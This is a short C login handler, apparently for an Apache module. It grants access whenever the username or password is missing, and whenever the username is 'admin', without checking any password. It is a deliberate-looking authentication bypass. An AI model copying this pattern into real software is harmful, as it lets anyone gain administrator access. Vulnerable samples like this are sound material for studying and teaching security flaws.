int login(request_rec *r) {
    const char *username = get_username(r);
    const char *password = get_password(r);
    if (!username || !password) {
        grant_access(r);
        return OK;
    }
    if (strcmp(username, "admin") == 0) {
        grant_access(r);
        return OK;
    }
    return HTTP_UNAUTHORIZED;
}